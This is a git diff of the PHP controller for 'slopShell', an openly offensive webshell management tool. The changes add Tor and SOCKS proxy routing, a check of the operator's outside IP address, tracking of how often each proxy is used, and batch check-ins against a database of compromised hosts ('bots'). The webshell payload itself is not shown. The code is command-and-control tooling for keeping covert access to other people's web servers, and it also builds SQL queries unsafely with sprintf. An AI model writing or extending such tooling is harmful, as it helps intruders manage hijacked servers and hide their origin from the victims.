@@ -75,7 +75,6 @@ function logo($last, $cl, bool $error, $error_value, string $lastHost)
 {
     if ($last === "q") {
         system($cl);
-        system("killall proxybroker");
         echo("\033[33;40m                                                                                    \033[0m\n");
         echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
         echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
@@ -86,7 +85,6 @@ function logo($last, $cl, bool $error, $error_value, string $lastHost)
         echo("\033[33;40m                                                                                    \033[0m\n");
         echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
         echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
-        print("\033[33;40m  All proxybroker instances have been killed, they died in peace.. in their sleep. F in chat to pay respects.\n");
     } else if (is_null($last)) {
         system($cl);
         echo("\033[33;40m                                                                                    \033[0m\n");
@@ -143,6 +141,15 @@ _MENU;
 
 }
 
+function update_proxy_db_entries(string $proxy, bool $succssful, string $last_contact){
+    if (!is_null($proxy) && !is_null($succssful) && !is_null($last_contact)) {
+        $tg = pg_fetch_row(pg_exec(pg_connect(DBCONN),
+            sprintf("SELECT times_used FROM sloppy_bots_proxies WHERE proxy = '%s'", $proxy)));
+        $tc = pg_exec(pg_connect(DBCONN),
+            sprintf("UPDATE sloppy_bots_proxies SET times_used = '%s', last_domain_contacted = '%s'  WHERE proxy = '%s'",
+                (int)$tg[0] + 1, $last_contact, $proxy));
+    }
+}
 
 function b64(array $what, $how, string $whereWeGo)
 {
@@ -368,7 +375,7 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
     }
 }
 
-function opts()
+function opts(bool $proxy_set)
 {
     system(clears);
     $ppg = pg_connect(DBCONN);
@@ -385,9 +392,17 @@ function opts()
         print("Could not connect... ensure the DB is running and we are allowed to connect to it.");
     }
     print("\n\n" . str_repeat("-", 35) . "\n");
-    print("\n\nProxybroker?\n\n");
-    system("ps aux | grep proxybroker");
-    echo "\n";
+    curl_setopt(CHH, CURLOPT_HEADER, 0);
+    curl_setopt(CHH, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt(CHH, CURLOPT_URL, "https://icanhazip.com");
+    if ($proxy_set === true){
+        echo "\e[0;32;40m[ ** ] Good job, proxy has been set. Please wait, checking what our IP address is. [ ** ]\e[0m".PHP_EOL;
+    }else{
+        echo "\e[0;31;40m[ !! ] No proxy has been set... [ !! ]\e[0m".PHP_EOL;
+    }
+    echo "[ ++ ] Our IP Address is: ".trim(curl_exec(CHH))." [ ++ ]".PHP_EOL;
+    curl_reset(CHH);
+    echo PHP_EOL;
 }
 
 function sys($host)
@@ -639,6 +654,10 @@ function aHo($host, $os, $checkIn)
     if (!empty($host)) {
         $path = parse_url($host);
         if ($t->insertRecord($path['scheme'] . "://" . $path['host'] . ":" . $path['port'], $path['path'], $os, $checkIn, $uuid = '', $action = 'add') != 0) {
+            if (strpos($path['path'], 'txt'))
+            {
+                logo('co',clears,true, 'Extension cannot end in anything other than php, as this is a php webshell.', sprintf('%s', $path['host'].$path['port'].":".$path['path']));
+            }
             logo('co',clears,false, '', sprintf('%s', $path['host'].$path['port'].":".$path['path']));
             echo "\n\nSuccessfully added: $host";
         } else {
@@ -742,7 +761,7 @@ function awesomeMenu(string $what)
 
 }
 
-function check($host, $path, $batch)
+function check($host, $path, $batch, $proxy)
 {
     if ($batch === "y") {
         logo('co',clears,false, '','');
@@ -758,15 +777,19 @@ function check($host, $path, $batch)
                     case 200:
                         print(sprintf(response_array['200'], $r['rhost'],$r['uri']));
                         pg_exec(pg_connect(DBCONN), sprintf("UPDATE sloppy_bots_main SET check_in = '%s' WHERE rhost = '%s'",  (int)$r['check_in'] + 1,$r['rhost']));
+                        update_proxy_db_entries($proxy, true, $r['rhost']);
                         break;
                     case 404:
                         print(sprintf(response_array['404'], $r['rhost'],$r['uri']));
+                        update_proxy_db_entries($proxy, true, $r['rhost']);
                         break;
                     case 500:
                         print(sprintf(response_array['500'], $r['rhost'],$r['uri']));
+                        update_proxy_db_entries($proxy, true, $r['rhost']);
                         break;
                     default:
                         print(sprintf(response_array['default'], $r['rhost'],$r['uri']));
+                        update_proxy_db_entries($proxy, false, $r['rhost']);
                         break;
                     }
         }
@@ -873,28 +896,25 @@ $curlopt_proxy_types = array(
     "http" => CURLPROXY_HTTP,
     "https" => CURLPROXY_HTTPS,
     "socks4" => CURLPROXY_SOCKS4,
-    "socks5" => CURLPROXY_SOCKS5
+    "socks5" => CURLPROXY_SOCKS5,
+    "tor" => CURLPROXY_SOCKS4
 );
-echo PHP_EOL."As of right now, the only proxy that is working with no issue is tor.".PHP_EOL;
-echo PHP_EOL."Working on rotating proxies, and dynamically updating the proxy as we use this.".PHP_EOL;
-echo PHP_EOL."For now, tor is the only real way to work with this.".PHP_EOL;
 switch (strtolower(readline("Would you like to configure the proxies?(y/n/tor)"))){
     case "y":
-        echo "Working on this part.".PHP_EOL;
         $cho = awesomeMenu('proxies');
-        $proxy_set = "yes";
+        $proxy_set = true;
         $proxy_target = $cho['Proxy'][0];
         $proxy_schema = $cho['Schema'];
         break;
     case "n":
-        echo "working on this part too".PHP_EOL;
-        $proxy_set = "no";
+        $proxy_set = false;
+        $proxy_schema = null;
+        $proxy_target = null;
         break;
     case "tor":
-        echo "working on this too".PHP_EOL;
-        $proxy_set = "tor";
+        $proxy_set = true;
         $proxy_target = "127.0.0.1:9050";
-        $proxy_schema = $curlopt_proxy_types['socks4'];
+        $proxy_schema = $curlopt_proxy_types['tor'];
         break;
 }
 while ($run) {
@@ -908,7 +928,7 @@ while ($run) {
     curl_reset(CHH);
     curl_setopt(CHH, CURLOPT_HEADER, 1);
     try {
-        if (is_null($proxy_set)) {
+        if ($proxy_set === false) {
             echo "\e[0;31;40mPROXY NOT SET.\e[0m".PHP_EOL;
             curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
             curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
@@ -920,6 +940,8 @@ while ($run) {
                 echo "\e[0;32;40mProxy Set: " . $proxy_target ."\e[0m".PHP_EOL;
                 if (strpos($proxy_schema, "http")) {
                     curl_setopt(CHH, CURLOPT_HTTPPROXYTUNNEL, 1);
+                }else{
+                    curl_setopt(CHH, CURLOPT_HTTPPROXYTUNNEL, 0);
                 }
                 curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 30);
                 curl_setopt(CHH, CURLOPT_TIMEOUT, 30);
@@ -945,25 +967,45 @@ while ($run) {
     logo($lc, clears, "", "", '');
     switch (strtolower($pw)) {
         case "r":
+            curl_reset(CHH);
+            echo PHP_EOL."As of right now, the only proxy that is working with no issue is tor.".PHP_EOL;
+            echo PHP_EOL."Working on rotating proxies, and dynamically updating the proxy as we use this.".PHP_EOL;
+            echo PHP_EOL."For now, tor is the only real way to work with this.".PHP_EOL;
             switch (strtolower(readline("Would you like to configure the proxies?(y/n/tor)"))){
                 case "y":
                     $cho = awesomeMenu('proxies');
-                    $proxy_set = "yes";
+                    $proxy_set = true;
                     $proxy_target = $cho['Proxy'][0];
                     $proxy_schema = $cho['Schema'];
                     break;
                 case "n":
-                    echo "working on this part too".PHP_EOL;
-                    $proxy_set = "no";
-                    $proxy_target = null;
+                    $proxy_set = false;
                     $proxy_schema = null;
+                    $proxy_target = null;
                     break;
                 case "tor":
-                    echo "working on this too".PHP_EOL;
-                    $proxy_set = "tor";
+                    $proxy_set = true;
                     $proxy_target = "127.0.0.1:9050";
                     $proxy_schema = "socks4";
                     break;
+            }
+            if ($proxy_set === false) {
+                curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
+                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
+                curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
+            } else {
+                curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
+                if (!is_null($proxy_target)){
+                    if (strpos($proxy_schema, "http")) {
+                        curl_setopt(CHH, CURLOPT_HTTPPROXYTUNNEL, 1);
+                    }else{
+                        curl_setopt(CHH, CURLOPT_HTTPPROXYTUNNEL, 0);
+                    }
+                    curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 30);
+                    curl_setopt(CHH, CURLOPT_TIMEOUT, 30);
+                    curl_setopt(CHH, CURLOPT_PROXYTYPE, $proxy_schema);
+                    curl_setopt(CHH, CURLOPT_PROXY, $proxy_target);
+                }
             }
             break;
         case "lt":
@@ -1097,13 +1139,13 @@ while ($run) {
                 switch ($b) {
                     case "y":
                         echo "Executing batch job!".PHP_EOL;
-                        check('0', 'b', "y");
+                        check('0', 'b', "y", $proxy_target);
                         break;
                     case "n":
                         echo "Not executing batch job.".PHP_EOL;
                         awesomeMenu("hosts");
                         $h = readline("Who is it we need to check on?(based on ID)".PHP_EOL."->");
-                        check($h, "chR", "n");
+                        check($h, "chR", "n", $proxy_target);
                         break;
                     default:
                         logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.".PHP_EOL, '');
@@ -1117,12 +1159,12 @@ while ($run) {
             logo($lc, clears, "", "", '');
             break;
         case "q":
-            logo('q', clears, false, '', '');
             curl_close(CHH);
+            logo('q', clears, false, '', '');
             $run = false;
             break;
         case "o":
-            opts();
+            opts($proxy_set);
             break;
         case "gp":
             grab_proxy(readline("Schema Please->"), 'http://localhost:8099/slop.php');
